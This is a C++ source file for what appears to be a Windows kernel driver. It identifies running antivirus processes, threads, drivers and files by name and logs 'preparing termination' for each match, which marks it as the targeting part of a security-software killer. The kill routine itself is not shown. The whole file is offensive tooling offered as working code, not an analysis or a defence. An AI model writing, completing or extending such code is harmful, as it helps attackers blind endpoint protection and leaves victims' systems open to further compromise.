#include "includes.h"
#include "modules.h"
#include "nt_structs.h"
#include "log.h"
#include "hooks.h"

// TODO: Clean

LONG g_logged = 0;
LONG g_logged1 = 0;
LONG g_logged2 = 0;



static bool AV::CompareStringsIgnoreCase( LPCWSTR a, LPCWSTR b ) {
    while ( *a && *b ) {
        WCHAR ca = RtlUpcaseUnicodeChar( *a++ );
        WCHAR cb = RtlUpcaseUnicodeChar( *b++ );
        if ( ca != cb ) return false;
    }
    return *a == 0 && *b == 0;
}

static const WCHAR* AV::ExtractFileName( const WCHAR* full_path, size_t length ) {
    const WCHAR* ptr = full_path + length;
    while ( ptr > full_path && *( ptr - 1 ) != L'\\' ) {
        --ptr;
    }
    return ptr;
}

static bool AV::CompareUnicodeStringToTarget( const UNICODE_STRING& uni_str, LPCWSTR target_name ) {
    if ( !uni_str.Buffer || uni_str.Length == 0 ) return false;
    size_t len = uni_str.Length / sizeof( WCHAR );
    const WCHAR* filename = ExtractFileName( uni_str.Buffer, len );
    return AV::CompareStringsIgnoreCase( filename, target_name );
}

bool AV::process_extraction( PEPROCESS process, LPCWSTR target_name ) {
    if ( !process || !target_name ) return false;

    UNICODE_STRING* process_image_name = nullptr;
    auto status = SeLocateProcessImageName( process, &process_image_name );
    if ( !NT_SUCCESS( status ) || !process_image_name || !process_image_name->Buffer )
        return false;

    bool result = AV::CompareUnicodeStringToTarget( *process_image_name, target_name );
    ExFreePool( process_image_name );

    if ( result && InterlockedCompareExchange( &g_logged, 1, 0 ) == 0 )
        Logger::Print( Logger::Level::Info, "AV Process identified - preparing termination" );

    return result;
}

bool AV::thread_extraction( PETHREAD thread, LPCWSTR target_name ) {
    if ( !thread || !target_name ) return false;

    PEPROCESS owning_process = IoThreadToProcess( thread );
    if ( !owning_process ) return false;

    UNICODE_STRING* process_image_name = nullptr;
    auto status = SeLocateProcessImageName( owning_process, &process_image_name );
    if ( !NT_SUCCESS( status ) || !process_image_name || !process_image_name->Buffer )
        return false;

    bool result = AV::CompareUnicodeStringToTarget( *process_image_name, target_name );
    ExFreePool( process_image_name );

    if ( result && InterlockedCompareExchange( &g_logged1, 1, 0 ) == 0 )
        Logger::Print( Logger::Level::Info, "AV Thread identified - preparing termination" );

    return result;
}

bool AV::driver_name_extraction( DRIVER_OBJECT* driver_object, LPCWSTR target_filename ) {
    if ( !driver_object || !target_filename ) return false;

    UNICODE_STRING driver_name = driver_object->DriverName;
    if ( !driver_name.Buffer || driver_name.Length == 0 ) return false;

    size_t max_length = driver_name.Length / sizeof( WCHAR );
    const WCHAR* buffer = driver_name.Buffer;

    // Find start of filename after last '\'
    const WCHAR* filename_start = buffer;
    for ( size_t i = max_length; i > 0; --i ) {
        if ( buffer[i - 1] == L'\\' ) {
            filename_start = &buffer[i];
            break;
        }
    }

    // Compare ignoring case
    const WCHAR* a = filename_start;
    const WCHAR* b = target_filename;
    while ( *a && *b ) {
        WCHAR ca = RtlUpcaseUnicodeChar( *a++ );
        WCHAR cb = RtlUpcaseUnicodeChar( *b++ );
        if ( ca != cb ) return false;
    }
    if ( *a || *b ) return false;

    if ( InterlockedCompareExchange( &g_logged2, 1, 0 ) == 0 )
        Logger::Print( Logger::Level::Info, "AV Driver identified - preparing termination" );

    return true;
}

bool AV::file_extraction( FILE_OBJECT* file, LPCWSTR target_extension ) {
    if ( !file || !target_extension ) return false;

    UNICODE_STRING fileName = file->FileName;
    if ( fileName.Length < 8 ) // minimum length check (e.g. "a.txt")
        return false;

    size_t len = fileName.Length / sizeof( WCHAR );
    LPCWSTR extension = &fileName.Buffer[len - 4]; // last 4 WCHAR for ".txt"

    if ( _wcsicmp( extension, target_extension ) == 0 ) {
        if ( InterlockedCompareExchange( &g_logged, 1, 0 ) == 0 )
            Logger::Print( Logger::Level::Info, "AV Process identified - preparing termination" );
        return true;
    }

    return false;
}
